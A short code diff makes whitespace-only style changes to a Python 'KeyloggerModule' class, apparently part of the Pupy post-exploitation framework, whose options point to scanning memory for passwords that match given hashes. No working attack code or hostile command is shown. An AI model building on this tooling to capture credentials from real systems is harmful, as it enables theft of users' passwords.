@@ -11,7 +11,7 @@ class KeyloggerModule(PupyModule):
     '''
     unique_instance = True
     dependencies = {
-        'linux': [ 'memorpy', 'hashmon' ],
+        'linux': ['memorpy', 'hashmon'],
     }
 
     @classmethod
@@ -36,7 +36,7 @@ class KeyloggerModule(PupyModule):
 
         if args.action == 'start':
             start(
-                [ x.strip() for x in args.filter.split(',') ],
+                [x.strip() for x in args.filter.split(',')],
                 hashes=args.hashes.split(),
                 poll=args.poll,
                 minpw=args.min, maxpw=args.max,
